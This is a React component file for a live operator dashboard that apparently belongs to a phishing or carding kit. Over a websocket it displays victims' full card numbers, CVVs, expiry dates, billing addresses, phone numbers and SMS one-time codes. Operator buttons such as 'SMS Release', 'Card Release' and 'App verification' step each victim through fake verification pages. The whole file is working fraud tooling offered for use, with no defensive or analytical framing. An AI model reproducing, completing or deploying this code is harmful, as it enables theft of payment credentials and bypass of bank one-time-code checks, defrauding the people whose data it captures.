import React from "react";
import ReactDOM from "react-dom/client";
import { io } from "socket.io-client";

const CardModal = ({
  open,
  setOpen,
  cardDetail,
  cardInfo,
  address,
  payment,
}) => {
  return (
    <div
      className={`fixed inset-0 bg-dark/90 dark:bg-white/5 backdrop-blur-sm z-[99999] ${
        open ? "!block" : "hidden"
      }
    overflow-y-auto`}
    >
      <div
        className="flex items-start justify-center min-h-screen px-4"
        onClick={() => setOpen(false)}
      >
        <div
          className={`bg-white dark:bg-dark dark:border-gray/20 border-2 border-lightgray/10 rounded-lg
            overflow-hidden my-8 w-60-rem md:inset-0 h-[calc(100%-1rem)]${
              open ? "block" : "hidden"
            }`}
          onAnimationEnd={(e) => {
            if (!open && e.animationName.includes("hide")) {
              e.target.style.display = "none";
            }
          }}
        >
          <div className="flex bg-white dark:bg-dark items-center border-b border-lightgray/10 dark:border-gray/20 justify-between px-5 py-3">
            {/* <h5 className="font-semibold text-lg">Card Detail</h5> */}
            <button
              type="button"
              className="text-lightgray hover:text-primary"
              onClick={() => setOpen(false)}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                className="w-5 h-5"
              >
                <path
                  d="M12.0007 10.5865L16.9504 5.63672L18.3646 7.05093L13.4149 12.0007L18.3646 16.9504L16.9504 18.3646L12.0007 13.4149L7.05093 18.3646L5.63672 16.9504L10.5865 12.0007L5.63672 7.05093L7.05093 5.63672L12.0007 10.5865Z"
                  fill="currentColor"
                />
              </svg>
            </button>
          </div>

          <div className="p-5 space-y-4">
            <div className="container">
              <div className="card">
                <div className="card-inner">
                  <div className="front">
                    <img
                      src="https://i.ibb.co/PYss3yv/map.png"
                      className="map-img"
                    />
                    <div className="row">
                      <img
                        src="https://i.ibb.co/G9pDnYJ/chip.png"
                        width="60px"
                      />
                      {cardDetail?.schema && (
                        <img
                          src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${cardDetail?.schema.toLowerCase()}.png`}
                          width="60px"
                        />
                      )}
                    </div>
                    <div className="row card-no">
                      <p>{cardInfo?.cardNumber}</p>
                    </div>
                    <div className="row card-holder">
                      <p>CARD HOLDER</p>
                      <p>EXPIRES</p>
                      <p>CVV</p>
                    </div>
                    <div className="row name">
                      <p>{payment?.holder}</p>
                      <p>
                        {" "}
                        {cardInfo && cardInfo.month && cardInfo.year
                          ? `${
                              cardInfo.month > 9
                                ? cardInfo.month
                                : `0${cardInfo.month}`
                            } / ${cardInfo.year}`
                          : ""}
                      </p>
                      <p> {cardInfo?.cvv}</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div class="grid-2">
              <div class="bg-gray-300 p-4">
                <div>
                  <h2 className="mb-5 font-bold py-4">Billing address</h2>

                  <table className="dark:border-gray/20 border-2 border-lightgray/10 p-2 rounded-lg mb-4">
                    <tbody>
                      {address?.address ? (
                        <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                          <td>Address:</td>
                          <td>{address.address}</td>
                        </tr>
                      ) : null}
                      {address?.straight ? (
                        <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                          <td>Straight:</td>
                          <td>{address.straight}</td>
                        </tr>
                      ) : null}
                      {address?.city ? (
                        <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                          <td>City:</td>
                          <td>{address.city}</td>
                        </tr>
                      ) : null}
                      {address?.state ? (
                        <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                          <td>State:</td>
                          <td>{address.state}</td>
                        </tr>
                      ) : null}
                      {address?.country ? (
                        <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                          <td>Country:</td>
                          <td>{address.country}</td>
                        </tr>
                      ) : null}
                      {address?.zipcode ? (
                        <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                          <td>Zipcode:</td>
                          <td>{address.zipcode}</td>
                        </tr>
                      ) : null}
                      {address?.email ? (
                        <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                          <td>Email:</td>
                          <td>{address.email}</td>
                        </tr>
                      ) : null}
                      {address?.phone ? (
                        <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                          <td>Phone:</td>
                          <td>{address.phone}</td>
                        </tr>
                      ) : null}{" "}
                    </tbody>
                  </table>
                </div>
              </div>

              <div class="bg-gray-500 p-4">
                <h2 className="mb-5 font-bold py-4">Payment Details</h2>
                <table className="dark:border-gray/20 border-2 border-lightgray/10 p-2 rounded-lg mb-4">
                  <tbody>
                    {cardInfo?.cardNumber ? (
                      <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                        <td>Card number:</td>
                        <td>{cardInfo?.cardNumber}</td>
                      </tr>
                    ) : null}
                    {cardInfo ? (
                      <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                        <td>Expiration:</td>
                        <td>
                          {" "}
                          {cardInfo && cardInfo.month && cardInfo.year
                            ? `${
                                cardInfo.month > 9
                                  ? cardInfo.month
                                  : `0${cardInfo.month}`
                              } / ${cardInfo.year}`
                            : ""}
                        </td>
                      </tr>
                    ) : null}
                    {cardInfo?.cvv ? (
                      <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                        <td>CVV:</td>
                        <td>{cardInfo?.cvv}</td>
                      </tr>
                    ) : null}
                    {cardDetail ? (
                      <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                        <td>Type:</td>
                        <td>
                          <span
                            className={`hover:text-primary text-xs ${
                              cardDetail && cardDetail.type === "CREDIT"
                                ? "text-success"
                                : "text-warning"
                            }`}
                          >
                            <i className="fa fa-credit-card mr-1"></i>
                            {cardDetail && cardDetail.type
                              ? cardDetail.type
                              : "Unknown"}
                          </span>
                        </td>
                      </tr>
                    ) : null}
                    {cardDetail?.schema ? (
                      <tr className="border-b border-lightgray/10 dark:border-gray/20 ">
                        <td>Bank:</td>
                        <td>{cardDetail?.schema}</td>
                      </tr>
                    ) : null}
                  </tbody>
                </table>
              </div>
            </div>
            {/* <div className="flex justify-end items-center gap-4"></div> */}
          </div>
        </div>
      </div>
    </div>
  );
};

const CustomerCard = ({ customer, index, timer, socket }) => {
  const {
    id,
    page,
    active,
    address,
    payment,
    sms,
    is_typing,
    submitted,
    verified,
    card_detail,
  } = customer;
  const [activeIndex, setActiveIndex] = React.useState(null);
  const [backgroundColor, setBackgroundColor] = React.useState("#FFFFFF");
  const [open, setOpen] = React.useState(false);
  const [dropdown, setDropdown] = React.useState(false);
  const [smsDropdown, setSmsDropdown] = React.useState(false);
  const dropdownRef = React.useRef(null);
  const smsdropdownRef = React.useRef(null);

  const handleAccordionClick = (index) => {
    setActiveIndex(activeIndex === index ? null : index);
  };

  const toggleDropdown = () => {
    setDropdown((prevState) => !prevState);
  };

  const closeDropdown = () => {
    setDropdown(false);
  };

  const toggleSmsDropdown = () => {
    setSmsDropdown((prevState) => !prevState);
  };

  const closeSmsDropdown = () => {
    setSmsDropdown(false);
  };

  React.useEffect(() => {
    if (is_typing === true || page) {
      setBackgroundColor("#B8FEBD");
      timer[index] = setTimeout(() => {
        setBackgroundColor("#FFFFFF");
      }, 1500);
    }
  }, [is_typing, page]);

  React.useEffect(() => {
    if (active === false) {
      setBackgroundColor("#F0F0F0");
    }
  }, [active]);

  React.useEffect(() => {
    const handleClickOutside = (event) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {
        closeDropdown();
      }

      if (
        smsdropdownRef.current &&
        !smsdropdownRef.current.contains(event.target)
      ) {
        closeSmsDropdown();
      }
    };

    document.addEventListener("click", handleClickOutside, true);

    return () => {
      document.removeEventListener("click", handleClickOutside, true);
    };
  }, [closeDropdown, closeSmsDropdown]);

  const description = React.useMemo(() => {
    if (page === "home") {
      return `It's on the home page`;
    } else if (page === "address") {
      // if (address) {
      // return 'The address page is currently being filled';
      // } else {
      return `It's on the address page`;
      // }
    } else if (page === "payment") {
      // if (payment) {
      // return 'The card number page is currently being filled';
      // } else {
      return `It's on the payment page`;
      // }
    } else if (page === "sms-app") {
      // if (payment) {
      // return 'The card number page is currently being filled';
      // } else {
      return `It's on the sms app verifications`;
      // }
    } else if (page === "sms" && !submitted) {
      // if (payment) {
      // return 'The card number page is currently being filled';
      // } else {
      return `It's on the sms page`;
      // }
    } else if (page === "sms" && submitted) {
      // if (payment) {
      // return 'The card number page is currently being filled';
      // } else {
      return `The verification code has been submitted`;
      // }
    } else if (page === "card-submitted") {
      return `This user has submitted card number. please process it in time`;
    }
  }, [payment, page, address, sms]);

  return (
    <div
      className="dark:border-gray/20 border-2 border-lightgray/10 p-2 rounded-lg mb-4"
      style={{
        backgroundColor,
        transition: active ? "background-color 2.5s ease-in-out" : "none",
      }}
    >
      <div className="flex gap-2 items-center">
        <div>
          <h1 className="text-sm">
            ID: <span className="text-xs text-gray">#{index + 1}</span>
          </h1>
        </div>
        <div>
          {payment && (
            <div className="flex gap-2 items-center">
              <div
                className="flex items-center border-2 border-lightgray/10 rounded-md p-1 cursor-pointer"
                onClick={() => setOpen(true)}
              >
                <span
                  className={`hover:text-primary text-xs ${
                    card_detail && card_detail.type === "CREDIT"
                      ? "text-success"
                      : "text-warning"
                  }`}
                >
                  <i className="fa fa-credit-card mr-1"></i>
                  {card_detail && card_detail.type
                    ? card_detail.type
                    : "Unknown"}
                </span>
              </div>
              <div className="flex items-center border-2 border-lightgray/10 rounded-md p-1">
                <span className="text-xs text-gray">
                  Phone Number: {address ? address.phone || "" : ""}
                </span>
              </div>
              <div className="flex items-center border-2 border-lightgray/10 rounded-md p-1">
                <span className="text-xs text-gray">
                  Holder: {payment.holder || ""}
                </span>
              </div>
              <div className="flex items-center border-2 border-lightgray/10 rounded-md p-1">
                <span className="text-xs text-gray">
                  Card Number: {payment.cardNumber || ""}
                </span>
              </div>
              <div className="flex items-center border-2 border-lightgray/10 rounded-md p-1">
                <span className="text-xs text-gray">
                  Expiry:{" "}
                  {payment.month && payment.year
                    ? `${
                        payment.month > 9 ? payment.month : `0${payment.month}`
                      }/${payment.year}`
                    : ""}
                </span>
              </div>
              <div className="flex items-center border-2 border-lightgray/10 rounded-md p-1">
                <span className="text-xs text-gray">CVV: {payment.cvv}</span>
              </div>
            </div>
          )}
        </div>
        {sms && (
          <div>
            <div className="flex gap-2 items-center">
              <div className="flex items-center border-2 border-lightgray/10 rounded-md p-1">
                <span className="text-xs text-gray">SMS: {sms.otp}</span>
              </div>
            </div>
            <div className="dropdown" ref={smsdropdownRef}>
              <button
                className="py-1 px-3 btn hover:bg-gray/10 border border-gray/10 rounded-full transition-all duration-300 flex items-center justify-center gap-1.5"
                onClick={toggleSmsDropdown}
              >
                Actions
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  className="w-5 h-5"
                >
                  <path
                    d="M11.9997 13.1714L16.9495 8.22168L18.3637 9.63589L11.9997 15.9999L5.63574 9.63589L7.04996 8.22168L11.9997 13.1714Z"
                    fill="currentColor"
                  />
                </svg>
              </button>
              {smsDropdown && (
                <>
                  {sms && (
                    <ul className="right-0 whitespace-nowrap p-0">
                      <li>
                        <button
                          onClick={() => {
                            socket.emit("smsPass");
                          }}
                        >
                          SMS Release
                        </button>
                      </li>
                      <li>
                        <button
                          onClick={() => {
                            socket.emit("smsReject");
                          }}
                        >
                          SMS Rejection
                        </button>
                      </li>
                      <li>
                        <button
                          onClick={() => {
                            socket.emit("changeCard");
                          }}
                        >
                          Change Card
                        </button>
                      </li>
                    </ul>
                  )}
                </>
              )}
            </div>
          </div>
        )}
        {page === "card-submitted" ? (
          <div className="dropdown" ref={dropdownRef}>
            <button
              className="py-1 px-3 btn hover:bg-gray/10 border border-gray/10 rounded-full transition-all duration-300 flex items-center justify-center gap-1.5"
              onClick={toggleDropdown}
            >
              Actions
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                className="w-5 h-5"
              >
                <path
                  d="M11.9997 13.1714L16.9495 8.22168L18.3637 9.63589L11.9997 15.9999L5.63574 9.63589L7.04996 8.22168L11.9997 13.1714Z"
                  fill="currentColor"
                />
              </svg>
            </button>
            {dropdown && (
              <>
                {page === "card-submitted" ? (
                  <ul className="right-0 whitespace-nowrap p-0">
                    <li>
                      <button
                        onClick={() => {
                          socket.emit("cardRelease");
                        }}
                      >
                        Card Release
                      </button>
                    </li>
                    <li>
                      <button
                        onClick={() => {
                          socket.emit("cancelCard");
                        }}
                      >
                        Card Rejection
                      </button>
                    </li>
                    <li>
                      <button
                        onClick={() => {
                          socket.emit("appVerification");
                        }}
                      >
                        App verification
                      </button>
                    </li>
                  </ul>
                ) : null}
              </>
            )}
          </div>
        ) : null}
      </div>
      <div className="flex gap-2 items-center">
        {verified && (
          <h1 className={`text-xs text-success`}>Verification completed</h1>
        )}
        <h1
          className={`text-xs ${
            page === "card-submitted" || submitted ? "text-danger" : ""
          }`}
        >
          {description}
        </h1>

        {address ? (
          <button
            type="button"
            className={`btn p-1 hover:bg-gray/10 border border-transparent rounded-full transition-all
            duration-300 ${
              activeIndex === 1 ? "!text-dark dark:!text-white" : "text-gray"
            }`}
            onClick={() => handleAccordionClick(1)}
          >
            On the Address Page ({Object.keys(address).length} data)
          </button>
        ) : null}
        {payment ? (
          <button
            type="button"
            className={`btn p-21hover:bg-gray/10 border border-transparent rounded-full transition-all
            duration-300 ${
              activeIndex === 2 ? "!text-dark dark:!text-white" : "text-gray"
            }`}
            onClick={() => handleAccordionClick(2)}
          >
            On the Card filling Page ({Object.keys(payment).length} data)
          </button>
        ) : null}
      </div>
      <div>
        {activeIndex !== null && (
          <div className="p-2 text-lightgray text-sm font-normal dark:border-gray/20 border-t-2 border-lightgray/10 mt-1">
            {activeIndex === 1 ? (
              <ul>
                {address.name ? (
                  <li>
                    <h2 className="text-sm">
                      Name: <span className="text-xs">{address.name}</span>
                    </h2>
                  </li>
                ) : null}
                {address.address ? (
                  <li>
                    <h2 className="text-sm">
                      Address:{" "}
                      <span className="text-xs">{address.address}</span>
                    </h2>
                  </li>
                ) : null}
                {address.straight ? (
                  <li>
                    <h2 className="text-sm">
                      Straight:{" "}
                      <span className="text-xs">{address.straight}</span>
                    </h2>
                  </li>
                ) : null}
                {address.city ? (
                  <li>
                    <h2 className="text-sm">
                      City: <span className="text-xs">{address.city}</span>
                    </h2>
                  </li>
                ) : null}
                {address.state ? (
                  <li>
                    <h2 className="text-sm">
                      State: <span className="text-xs">{address.state}</span>
                    </h2>
                  </li>
                ) : null}
                {address.country ? (
                  <li>
                    <h2 className="text-sm">
                      Country:{" "}
                      <span className="text-xs">{address.country}</span>
                    </h2>
                  </li>
                ) : null}
                {address.zipcode ? (
                  <li>
                    <h2 className="text-sm">
                      ZipCode:{" "}
                      <span className="text-xs">{address.zipcode}</span>
                    </h2>
                  </li>
                ) : null}
                {address.email ? (
                  <li>
                    <h2 className="text-sm">
                      Email: <span className="text-xs">{address.email}</span>
                    </h2>
                  </li>
                ) : null}
                {address.phone ? (
                  <li>
                    <h2 className="text-sm">
                      Phone: <span className="text-xs">{address.phone}</span>
                    </h2>
                  </li>
                ) : null}
              </ul>
            ) : activeIndex === 2 ? (
              <ul>
                {payment.holder ? (
                  <li>
                    <h2 className="text-sm">
                      Card Holder:{" "}
                      <span className="text-xs">{payment.holder}</span>
                    </h2>
                  </li>
                ) : null}
                {payment.cardNumber ? (
                  <li>
                    <h2 className="text-sm">
                      Card Number:{" "}
                      <span className="text-xs">{payment.cardNumber}</span>
                    </h2>
                  </li>
                ) : null}
                {payment.year && payment.month ? (
                  <li>
                    <h2 className="text-sm">
                      Expiry:{" "}
                      <span className="text-xs">
                        {payment.month > 9
                          ? payment.month
                          : `0${payment.month}`}
                        /{payment.year}
                      </span>
                    </h2>
                  </li>
                ) : null}
                {payment.cvv ? (
                  <li>
                    <h2 className="text-sm">
                      CVV: <span className="text-xs">{payment.cvv}</span>
                    </h2>
                  </li>
                ) : null}
              </ul>
            ) : null}
          </div>
        )}
      </div>
      <CardModal
        open={open}
        setOpen={setOpen}
        cardDetail={card_detail}
        cardInfo={payment}
        address={address}
        payment={payment}
      />
    </div>
  );
};

const DashboardList = ({ url, newVisitor, sitePath }) => {
  const [customers, setCustomers] = React.useState([]);
  const [onlineClients, setOnlineClients] = React.useState(0);
  const [socket, setSocket] = React.useState(null);
  const [timerArray, setTimerArray] = React.useState([]);

  React.useEffect(() => {
    setSocket(io(url, { transports: ["websocket"] }));
  }, [url]);

  React.useEffect(() => {
    if (socket) {
      socket.on("connect", () => {
        socket.emit("refresh");
      });

      socket.on("refreshClients", (data) => {
        const { clients } = data;
        timerArray.map((i) => setTimeout(() => clearTimeout(i), 1500));
        setCustomers(clients);
        setTimerArray(Array(clients.length));
        setOnlineClients(clients.length);
      });

      const timer = setInterval(() => {
        socket.emit("onlineClients");
      }, 2500);

      return () => {
        clearInterval(timer);
        socket.off("filterOnlineClients");
        socket.disconnect();
      };
    }
  }, [socket]);

  return (
    <div>
      <div className="flex justify-between items-center mb-4">
        <h5>Visitors today: {newVisitor}</h5>
        <h5>Online: {onlineClients}</h5>
        <h5>Current Path: {sitePath}</h5>
      </div>
      <div className="flex justify-between items-center mb-4">
        <h2>Real Time Data</h2>
        <button
          className="py-1 px-3 btn bnt-sm bg-primary border border-primary rounded-md text-white transition-all duration-300 hover:bg-primary/[0.85] hover:border-primary/[0.85]"
          onClick={() => {
            setCustomers([]);
            socket.emit("refresh");
          }}
        >
          Refresh
        </button>
      </div>
      {customers.map((customer, index) => (
        <CustomerCard
          customer={customer}
          key={index}
          index={index}
          timer={timerArray}
          socket={socket}
        />
      ))}
    </div>
  );
};

export default DashboardList;

if (document.getElementById("dashboard-list")) {
  const root = ReactDOM.createRoot(document.getElementById("dashboard-list"));
  const url = document.getElementById("dashboard-list").getAttribute("url");
  let sitePath = document
    .getElementById("dashboard-list")
    .getAttribute("sitePath");
  let newVisitor = document
    .getElementById("dashboard-list")
    .getAttribute("newVisitor");
  root.render(
    <DashboardList url={url} newVisitor={newVisitor} sitePath={sitePath} />
  );
}
